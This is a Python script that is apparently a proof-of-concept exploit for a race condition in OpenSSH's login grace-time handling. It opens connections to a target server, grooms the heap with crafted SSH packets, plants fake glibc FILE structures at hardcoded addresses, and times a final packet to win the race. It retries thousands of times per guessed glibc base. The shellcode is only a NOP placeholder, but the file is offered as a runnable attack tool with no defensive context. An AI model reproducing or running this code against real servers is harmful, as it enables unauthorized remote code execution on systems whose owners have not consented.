import socket
import time
import random
import struct
import errno
import fcntl
import os

MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120
CHUNK_ALIGN = lambda s: (s + 15) & ~15

GLIBC_BASES = [0xb7200000, 0xb7400000]
NUM_GLIBC_BASES = len(GLIBC_BASES)

# Shellcode placeholder (replace with actual shellcode)
shellcode = b"\x90\x90\x90\x90"

def setup_connection(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # 5 seconds timeout for connection
        sock.connect((ip, port))
        sock.setblocking(False)  # Set to non-blocking after connection is established
        return sock
    except socket.error as e:
        print(f"setup_connection error: {e}")
        return None

def send_packet(sock, packet_type, data):
    packet_len = len(data) + 5
    packet = struct.pack('>I', packet_len) + bytes([packet_type]) + data
    try:
        sock.sendall(packet)
    except IOError as e:
        print(f"send_packet error: {e}")

def send_ssh_version(sock):
    ssh_version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
    try:
        sock.sendall(ssh_version)
    except IOError as e:
        print(f"send_ssh_version error: {e}")

def receive_ssh_version(sock):
    try:
        data = sock.recv(256)
        if data:
            print(f"Received SSH version: {data.decode()}")
            return True
    except IOError as e:
        if e.errno != errno.EWOULDBLOCK and e.errno != errno.EAGAIN:
            print(f"receive_ssh_version error: {e}")
    return False

def send_kex_init(sock):
    kexinit_payload = b'\x00' * 36
    send_packet(sock, 20, kexinit_payload)

def receive_kex_init(sock):
    try:
        data = sock.recv(1024)
        if data:
            print(f"Received KEX_INIT ({len(data)} bytes)")
            return True
    except IOError as e:
        if e.errno != errno.EWOULDBLOCK and e.errno != errno.EAGAIN:
            print(f"receive_kex_init error: {e}")
    return False

def perform_ssh_handshake(sock):
    send_ssh_version(sock)
    if not receive_ssh_version(sock):
        return False
    send_kex_init(sock)
    if not receive_kex_init(sock):
        return False
    return True

def prepare_heap(sock):
    for _ in range(10):
        tcache_chunk = b'A' * 64
        send_packet(sock, 5, tcache_chunk)

    for _ in range(27):
        large_hole = b'B' * 8192
        send_packet(sock, 5, large_hole)
        small_hole = b'C' * 320
        send_packet(sock, 5, small_hole)

    for _ in range(27):
        fake_data = bytearray(4096)
        create_fake_file_structure(fake_data, GLIBC_BASES[0])
        send_packet(sock, 5, fake_data)

    large_string = b'E' * (MAX_PACKET_SIZE - 1)
    send_packet(sock, 5, large_string)

def create_fake_file_structure(data, glibc_base):
    fake_file = struct.pack('P'*18 + 'I'*3 + '40s' + 'P',
                            0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
                            0x61, b'\x00'*40, 0)
    data[:len(fake_file)] = fake_file
    struct.pack_into('Q', data, len(data) - 16, glibc_base + 0x21b740)
    struct.pack_into('Q', data, len(data) - 8, glibc_base + 0x21d7f8)

def time_final_packet(sock):
    time_before = measure_response_time(sock, 1)
    time_after = measure_response_time(sock, 2)
    parsing_time = time_after - time_before
    print(f"Estimated parsing time: {parsing_time:.6f} seconds")
    return parsing_time

def measure_response_time(sock, error_type):
    if error_type == 1:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3"
    else:
        error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"
    
    start = time.monotonic()
    send_packet(sock, 50, error_packet)
    
    try:
        sock.recv(1024)
    except IOError as e:
        if e.errno not in [errno.EWOULDBLOCK, errno.EAGAIN]:
            print(f"measure_response_time error: {e}")
    
    end = time.monotonic()
    return end - start

def create_public_key_packet(packet, glibc_base):
    offset = 0
    for _ in range(27):
        struct.pack_into('>I', packet, offset, CHUNK_ALIGN(4096))
        offset += CHUNK_ALIGN(4096)
        struct.pack_into('>I', packet, offset, CHUNK_ALIGN(304))
        offset += CHUNK_ALIGN(304)

    packet[:8] = b'ssh-rsa '
    packet[CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13 : CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13 + len(shellcode)] = shellcode

    for i in range(27):
        create_fake_file_structure(packet[CHUNK_ALIGN(4096) * (i + 1) + CHUNK_ALIGN(304) * i:], glibc_base)

def attempt_race_condition(sock, parsing_time, glibc_base):
    final_packet = bytearray(MAX_PACKET_SIZE)
    create_public_key_packet(final_packet, glibc_base)
    
    try:
        sock.sendall(final_packet[:-1])
    except IOError as e:
        print(f"attempt_race_condition error: {e}")
        return False

    start = time.monotonic()
    while True:
        elapsed = time.monotonic() - start
        if elapsed >= (LOGIN_GRACE_TIME - parsing_time - 0.001):
            try:
                sock.sendall(final_packet[-1:])
            except IOError as e:
                print(f"attempt_race_condition error: {e}")
                return False
            break

    try:
        response = sock.recv(1024)
        if response:
            print(f"Received response after exploit attempt ({len(response)} bytes)")
            if response[:8] != b"SSH-2.0-":
                print("Possible hit on 'large' race window")
                return True
        else:
            print("Connection closed by server - possible successful exploitation")
            return True
    except IOError as e:
        if e.errno in [errno.EWOULDBLOCK, errno.EAGAIN]:
            print("No immediate response from server - possible successful exploitation")
            return True
        else:
            print(f"attempt_race_condition error: {e}")
    return False

def perform_exploit(ip, port):
    success = False
    parsing_time = 0
    timing_adjustment = 0

    for base_idx in range(NUM_GLIBC_BASES):
        glibc_base = GLIBC_BASES[base_idx]
        print(f"Attempting exploitation with glibc base: 0x{glibc_base:x}")

        for attempt in range(10000):
            if attempt % 1000 == 0:
                print(f"Attempt {attempt} of 10000")

            sock = setup_connection(ip, port)
            if not sock:
                print(f"Failed to establish connection, attempt {attempt}")
                continue

            if not perform_ssh_handshake(sock):
                print(f"SSH handshake failed, attempt {attempt}")
                sock.close()
                continue

            prepare_heap(sock)
            parsing_time = time_final_packet(sock) + timing_adjustment

            if attempt_race_condition(sock, parsing_time, glibc_base):
                print(f"Possible exploitation success on attempt {attempt} with glibc base 0x{glibc_base:x}!")
                success = True
                break
            else:
                timing_adjustment += 0.00001

            sock.close()
            time.sleep(0.1)  # 100ms delay between attempts

        if success:
            break

    return success

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <ip> <port>")
        sys.exit(1)

    ip = sys.argv[1]
    port = int(sys.argv[2])
    perform_exploit(ip, port)
